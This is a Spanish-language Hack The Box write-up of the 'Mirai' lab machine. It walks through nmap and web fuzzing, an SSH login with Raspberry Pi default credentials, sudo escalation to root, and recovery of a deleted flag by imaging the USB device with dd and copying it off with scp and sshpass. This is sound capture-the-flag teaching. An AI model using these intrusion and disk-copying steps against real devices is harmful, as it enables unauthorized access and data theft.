---
title: "Mirai - Hack The Box"
date: 2023-03-06
draft: false
slug: "htb-writeup-mirai"
excerpt: "Esta es una de las máquinas más sencillas que he hecho, pues no es mucho lo que tienes que hacer, aunque la investigación si me tomo algo de tiempo. Lo que haremos será usar credenciales por defecto del SO Raspberry Pi para entrar al SSH y con esto obtener las flags, lo único quizá difícil, es la forma de recuperar un .txt que fue eliminado. Igual, vamos a probar la forma de copiar el disco que tiene los archivos borrados y trataremos de recuperarlos en nuestra máquina."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Pi-Hole", "Raspberry Pi", "Default Credentials", "Privesc - Abusing Sudoers Privileges", "Privesc - Recovering Deleted Files", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "dig"
  - "searchploit"
  - "python2"
  - "ssh"
  - "df"
  - "strings"
  - "dd"
  - "scp"
  - "gzip"
  - "sshpass"
  - "extundelete"
links:
  - "https://es.wikipedia.org/wiki/Pi-hole"
  - "https://raspberrypi.cl/que-es-raspberry/"
  - "https://www.raspberrypi.com/software/"
  - "https://www.reddit.com/r/pihole/comments/8kw5z8/dashboard_default_password/?rdt=51247"
  - "https://www.makeuseof.com/tag/raspbian-default-password/"
  - "https://thehackerway.com/2021/04/12/enumeracion-en-linux-para-post-explotacion-parte-4/"
  - "https://marquesfernandes.com/es/tecnologia-es/como-recuperar-deleted-files-no-linux-ubuntu-debian/"
  - "https://www.softzone.es/linux/programas/programas-recuperar-datos-eliminados-linux/"
  - "https://tecnonautas.net/como-mostrar-los-caracteres-imprimibles-de-un-archivo-con-el-comando-strings/"
  - "https://www.stackscale.com/es/blog/inodos-linux/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-mirai/mirai_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL sabremos que SO usa la máquina.
```bash
ping -c 4 10.10.10.48                               
PING 10.10.10.48 (10.10.10.48) 56(84) bytes of data.
64 bytes from 10.10.10.48: icmp_seq=1 ttl=63 time=130 ms
64 bytes from 10.10.10.48: icmp_seq=2 ttl=63 time=131 ms
64 bytes from 10.10.10.48: icmp_seq=3 ttl=63 time=130 ms
64 bytes from 10.10.10.48: icmp_seq=4 ttl=63 time=130 ms

--- 10.10.10.48 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 129.933/130.197/130.701/0.300 ms
```
Ahora sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.48 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:21 CST
Initiating SYN Stealth Scan at 11:21
Scanning 10.10.10.48 [65535 ports]
Discovered open port 22/tcp on 10.10.10.48
Discovered open port 80/tcp on 10.10.10.48
Discovered open port 53/tcp on 10.10.10.48
Discovered open port 32469/tcp on 10.10.10.48
Discovered open port 32400/tcp on 10.10.10.48
Discovered open port 1844/tcp on 10.10.10.48
Completed SYN Stealth Scan at 11:22, 23.74s elapsed (65535 total ports)
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.41s latency).
Scanned at 2023-03-06 11:21:53 CST for 24s
Not shown: 35462 closed tcp ports (reset), 30070 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
1844/tcp  open  direcpc-dll syn-ack ttl 63
32400/tcp open  plex        syn-ack ttl 63
32469/tcp open  unknown     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
           Raw packets sent: 114990 (5.060MB) | Rcvd: 35878 (1.435MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay solamente 3 puertos abiertos, es curioso porque es similar a la máquina anterior que hicimos. Hagamos el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,53,80,1844,32400,32469 10.10.10.48 -oN targeted                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:23 CST
Nmap scan report for 10.10.10.48
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)

| ssh-hostkey: 
|   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
|   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
|   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
|_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
53/tcp open  domain  dnsmasq 2.76

| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1844/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd

|_http-favicon: Plex
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, de momento no tenemos credenciales para el **servicio SSH**, así que vamos a ver directamente la página del **servicio HTTP** y si recordamos, el puerto 53 parece ser que usa un **servicio DNS** para **virtual hosting**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Vamo a entrar.

![](/assets/images/htb-writeup-mirai/Captura1.png)

Mmmm...no hay nada, veamos que dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-mirai/Captura2.png">
</p>

No pues, no veo que eso nos ayude mucho, vamos a hacer dos cosas, una va a ser investigar el servidor web que usa la máquina y a usar la herramienta **Whatweb** para ver que información extra nos puede dar.

| **Servidor lighttp** |
|:-----------:|
| *lighttpd es un servidor web diseñado para ser rápido, seguro, flexible, y fiel a los estándares. Está optimizado para entornos donde la velocidad es muy importante, y por eso consume menos CPU y memoria RAM que otros servidores.* |

Mmmm no nos sirve mucho esto, usemos **Whatweb**:
```bash
whatweb http://10.10.10.48/                                                                                         
http://10.10.10.48/ [404 Not Found] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.35], IP[10.10.10.48], UncommonHeaders[x-pi-hole], lighttpd[1.4.35]
```
Veo algo curioso, **UncommonHeaders[x-pi-hole]**, investiguemos que es eso de **x-pi-hole**.

| **Aplicación Pi-Hole** |
|:-----------:|
| *Pi-hole es una aplicación para bloqueo de anuncios y rastreadores en Internet a nivel de red en Linux que actúa como un sumidero de DNS, destinado para su uso en una red privada. Está diseñado para su uso en dispositivos embebidos con capacidad de red, como el Raspberry Pi pero también se puede utilizar en otras máquinas que ejecuten distribuciones Linux e implementaciones en la nube.* |

Ok, entonces por lo que entiendo, nos estamos enfrentando a una máquina que usa un dispositivo llamado **Raspberry Pi**. Investiguémoslo.

| **Raspberry Pi** |
|:-----------:|
| *La Raspberry Pi es una computadora de bajo costo y con un tamaño compacto, del porte de una tarjeta de crédito, puede ser conectada a un monitor de computador o un TV, y usarse con un mouse y teclado estándar.* |

Vaya, ósea que es una minicomputadora por así decirlo. Además, este aparato tiene un sistema operativo propio llamado **Raspberry Pi OS**, este SO esta hecho con **Linux** por lo que debe de tener claves por defecto, que quizá podamos usar en el **servicio SSH**. Busquemos:
* <a href="https://www.makeuseof.com/tag/raspbian-default-password/" target="_blank">What's the Default Username and Password for Raspberry Pi OS (Raspbian)?</a>

Según la página que encontré, el usuario y contraseña por defecto son:
* *Usuario: pi*
* *Contraseña raspberry*

Excelente, antes de irnos a probar estas credenciales, veamos si hay algún directorio en el **servicio HTTP**, apliquemos **Fuzzing**.

### Aplicando Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.48/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.48/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000004238:   200        0 L      1 W        18 Ch       "versions"                                                                                                                                                                
000000259:   200        302 L    962 W      14620 Ch    "admin"                                                                                                                                                                   

Total time: 0
Processed Requests: 220560
Filtered Requests: 220558
Requests/sec.: 
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Bien, ahora probemos con **Gobuster**:
```bash
gobuster dir -u http://10.10.10.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.48/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48/admin/]
/versions             (Status: 200) [Size: 13]
Progress: 220461 / 220561 (99.95%)
===============================================================
2024/04/28 15:23:13 Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ok, veamos el directorio **/admin**:

<p align="center">
<img src="/assets/images/htb-writeup-mirai/Captura3.png">
</p>

Muy bien, esto es el dashboard de **Pi-hole**, parece que tiene un login, vamos a verlo:

<p align="center">
<img src="/assets/images/htb-writeup-mirai/Captura4.png">
</p>

Unicamente nos pide la contraseña para poder entrar, busquemos si hay una credencial por defecto para **Pi-hole**:
* Posible: **pi-hole**

<p align="center">
<img src="/assets/images/htb-writeup-mirai/Captura5.png">
</p>

No funciono, de acuerdo a un blog en **Reddit**, **Pi-hole** crea una contraseña random y la da al usuario, existe un comando para poder cambiarla y este mismo nos lo muestra el dashboard, aca te pongo el blog:
* <a href="https://www.reddit.com/r/pihole/comments/8kw5z8/dashboard_default_password/?rdt=51247" target="_blank">Dashboard Default Password</a>

Puedes intentar cambiar la contraseña después.

Por último, veamos si podemos entrar a los otros servicios activos.

### Investigando los Otros Servicios {#HTTP2}

Vamos a investigar los servicios que estan en los puertos 53 y 32400.

#### Analizando Servicio DNS {#dig}

Investiguemos un poco sobre el servicio DNS que esta activo en la máquina:

| **Software dnsmasq** |
|:-----------:|
| *dnsmasq es un software que proporciona almacenamiento en caché para el sistema de nombres de dominio, servidor de protocolo de configuración dinámica de host, enrutador de publicidad y funciones de arranque de red para pequeñas redes informáticas, creado como software libre.​​* |

Ok, veamos si podemos encontrar algo de información usando la herramienta **dig**:
```bash
dig @10.10.10.48 axrf
.
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.48 axrf
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42203
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
.
;; QUESTION SECTION:
;axrf.                          IN      A
.
;; Query time: 68 msec
;; SERVER: 10.10.10.48#53(10.10.10.48) (UDP)
;; MSG SIZE  rcvd: 22
```

Intente hacer una tranferencia de zona, pero no tengo un dominio al cual hacerlo, probemos con uno posible:
```bash
dig @10.10.10.48 mirai.htb axrf
;; communications error to 10.10.10.48#53: timed out
;; communications error to 10.10.10.48#53: timed out
;; communications error to 10.10.10.48#53: timed out

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.48 mirai.htb axrf
; (1 server found)
;; global options: +cmd
;; no servers could be reached

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17742
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;axrf.                          IN      A

;; Query time: 80 msec
;; SERVER: 10.10.10.48#53(10.10.10.48) (UDP)
;; MSG SIZE  rcvd: 22
```
Nada, este servicio queda descartado para obtener información.

#### Analizando Servicio de Puerto 32400 {#HTTP3}

Veamos que nos encontramos, si entramos en el servicio que esta corriendo en el **puerto 32400**:

<p align="center">
<img src="/assets/images/htb-writeup-mirai/Captura6.png">
</p>

Bien, investiguemos de que va este servicio:

| **Servicio Flex** |
|:-----------:|
| *Plex organiza video, música y fotos de librerías de medios personales y hace stream de estos a smart TVs, reproductores de medios y dispositivos móviles.* |

No creo que nos sea de utilidad este servicio.

Excelente, es hora de probar las credenciales por defecto en el **servicio SSH**.

## Explotación de Vulnerabilidades {#Explotacion}

### Comprobando Existencia de Usuario {#Exploit}

Si recordamos, existe un Exploit que nos ayuda a comprobar que existe un usuario dentro del **servicio SSH**. Vamos a utilizarlo, para comprobar si existe el **usuario pi** en el **servicio SSH**.

Hagamoslo por pasos:

* Busquemos el Exploit, recuerda que es el **OpenSSH < 7.7 - User Enumeration (2)**:
```bash
searchsploit openssh 6.1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path

|---|---|
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                                           | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                                                             | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                                                                   | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                                                     | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                                     | linux/remote/45939.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                                                                      | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                                                                        | linux/remote/25.c
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                                                                     | multiple/remote/3303.sh

|---|---|
Shellcodes: No Results
Papers: No Results
```
Se supone que la versión de este Exploit se ajusta a la que usa la máquina. Copialo en tu directorio de trabajo y cambiale el nombre si quieres.

* Ejecutemoslo usando el **usuario pi**:
```bash
python2 SSH_Enum.py 10.10.10.48 pi 2>/dev/null
[-] pi is an invalid username
```
Mmmm que curioso, no lo detecta. Esto es un ejemplo perfecto, de que no todos los Exploits son confiables.

### Probando Credenciales por Defecto {#Creds}

Intentemos entrar usando las credenciales por defecto de **Raspberry Pi**:
```bash
ssh pi@10.10.10.48                   
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ whoami
pi
```

?...Bueno ya que estamos dentro, busquemos alguna flag:
```bash
pi@raspberrypi:/home $ cd pi
pi@raspberrypi:~ $ ls
background.jpg  Desktop  Documents  Downloads  Music  oldconffiles  Pictures  Public  python_games  Templates  Videos
pi@raspberrypi:~ $ cd Public
pi@raspberrypi:~/Public $ ls
pi@raspberrypi:~/Public $ cd ../Desktop/
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
```
Ahí está la flag del usuario.

## Post Explotación {#Post}

### Enumeración de Máquina y Escalando Privilegios {#Enum}

Lo de siempre, veamos los permisos que tenemos:
```bash
pi@raspberrypi:~/Desktop $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
```

Somos **sudoers**...entremos como Root:
```bash
pi@raspberrypi:~/Desktop $ sudo su
root@raspberrypi:/home/pi/Desktop# whoami
root
```

Vaya que fácil, bueno busquemos la flag donde siempre:
```bash
root@raspberrypi:/home/pi/Desktop# cd /root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```
Interesante, no tenemos la flag del Root, pero viene una pista de donde puede estar.

Por lo que se, en Linux existe un directorio llamado **Media**, en donde se conectan dispositivos vía USB, vamos a ese directorio:
```bash
root@raspberrypi:~# cd /media
root@raspberrypi:/media# ls
usbstick
```

¡Ahí está! Veamos el interior:
```bash
root@raspberrypi:/media# cd usbstick/
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
.
-James
```

| **Traducción** |
|:-----------:|
| *¡Maldición! Lo siento amigo, accidentalmente elimine tus archivos de la memoria USB. ¿Sabes si hay alguna manera de recuperarlos?* |

Me lleva el diablo James, debemos investigar como recuperar ese archivo.

### Recuperando Archivos Borrados de USB {#USB}

Después de investigar un rato, hay algo que podemos intentar, usaremos el **comando strings** para listar el contenido del USB. 

Para hacer esto, primero debemos mostrar la información relativa al espacio total y disponible del sistema de archivos, esto lo hacemos con el **comando df**:
```bash
root@raspberrypi:/media/usbstick# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
```

Justamente ahí se ve en donde estamos, esa partición es la que vamos a analizar con el **comando strings**:
```bash
root@raspberrypi:/media/usbstick# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
-----flag------
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
¡Ahora sí! Ya tenemos la flag del Root.

### Recuperando Archivos Borrados con Distintas Herramientas {#USB2}

Vamos a probar algunas herramientas que nos pueden ayudar a recuperar archivos eliminados, pero para hacer esto, necesitamos copiarnos el disco **/dev/sdb** que almacena la montura del USB en la máquina víctima hacia nuestra máquina.

Esto lo podemos hacer, usando el **comando dd** para copiar el contenido del disco y con el **comando gzip**, lo almacenamos en un archivo comprimido para poder transportarlo a cualquier lado. Hagamoslo por pasos:

* Copia y comprime el **disco /dev/sdb**, guarda el resultado en el escritorio del **usuario pi**:
```bash
dd if=/dev/sdb | gzip -1 > /home/pi/Desktop/disco_comprimido.gz
```

* Copia ese archivo comprimido en tu máquina con el **comando scp**:
```bash
scp pi@10.10.10.48:/home/pi/Desktop/disco_comprimido.gz .
```

* Por último, descomprime el archivo, la data que contiene, debe ser guardada con el comando dd:
```bash
gzip -d -c disco_comprimido.gz | dd of=/Tu_directorio/De_trabajo/disco
```

* Revisa que se haya copiado correctamente:
```bash
file disco
disco: Linux rev 1.0 ext4 filesystem data, UUID=635bcd7f-1d95-4229-bf13-3e722026db3c (extents) (huge files)
.
ls -hl disco
.rw-r--r-- root root 10 MB Mon Mar 06 22:11:14 2023  disco
```
Excelente, hemos copiado con exito el disco que almacena la USB con los archivos borrados. 

Podemos automatizar todo esto con la **herramienta sshpass**:

| **Herramienta sshpass** |
|:-----------:|
| *Sshpass es una herramienta que vienen todas las distros Linux pero no viene instalada por defecto y te permite el poder añadir en una única línea de terminal la dirección del servidor y la contraseña.* |

Vamos a meter los comandos necesarios para, obtener la data, guardarla en un archivo comprimido y mandarla a nuestra máquina.

Hagamoslo por pasos:

* Usemos la **herramienta sshpass** con los paremetros -p, para meter la contraseña del **usuario pi**, indicarle que se va a conectar al **servicio SSH**, metemos el usuario y la IP, le indicamos que va a ejecutar los comandos que usamos para obtener la data y guardarla en un archivo comprimido del **disco /dev/sdb** y lo guardamos a nuestra máquina:
```bash
sshpass -p raspberry ssh pi@10.10.10.48 "sudo dd if=/dev/sdb | gzip -1" | dd of=disco_comprimido.gz
.
ls
disco  disco_comprimido.gz
```

* Descomprime el archivo obtenido:
```bash
gzip -d disco_comprimido.gz
```

* Comprueba que el archivo se copio correctamente:
```bash
file disco_comprimido
disco_comprimido: Linux rev 1.0 ext4 filesystem data, UUID=635bcd7f-1d95-4229-bf13-3e722026db3c (extents) (huge files)
.
ls -lh disco_comprimido
.rw-r--r-- root root 10 MB Mon Mar 06 22:15:27 2023  disco_comprimido
```
Excelente, ahora veamos que herramientas podemos utilizar.

#### Utilizando Herramienta Extundelete {#extundelete}

Investiguemos un poco esta herramienta:

| **Herramienta Extundelete** |
|:-----------:|
| *Extundelete es una utilidad de línea de comandos de código abierto que permite a los usuarios recuperar archivos borrados de un EXT3 o EXT4 de Linux. Sistema de archivos EXT4.* |

Bien, si no la tienes instalada, usa el siguiente comando:
```bash
apt install extundelete
```

Es muy simple su uso, debemos indicarle el arhivo EXT4 (que es el que tenemos), le indicamos que debe recuperar todos los archivos y donde va a guardar los archivos que vaya a recuperar, hagamoslo:
```bash
extundelete disco_comprimido --restore-all -o recuperado
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Loading journal descriptors ... 23 descriptors loaded.
Searching for recoverable inodes in directory / ... 
1 recoverable inodes found.
Looking through the directory structure for deleted files ... 
0 recoverable inodes still lost.
```

Verifica que se creó el directorio y los archivos se hayan recuperado:
```bash
ls 
disco  disco_comprimido  recuperado
.
cd recuperado
ls
 root.txt
.
cat root.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: root.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ....
```
Funciono correctamente.

Existen otras herramientas como **testdisk, foremost, scalpel**, etc. En mi caso, probe primero la **herramienta testdisk**, pero el archivo que recupero no tenia contenido, así que la descarte para ponerla. También probe la **herramienta foremost**, pero no sabía que se debe montar primero el disco y luego hace la recuperación, ya no lo hice por flojo, pero puedes intentarlo e igual puedes probar ahí la **herramienta scalpel**.
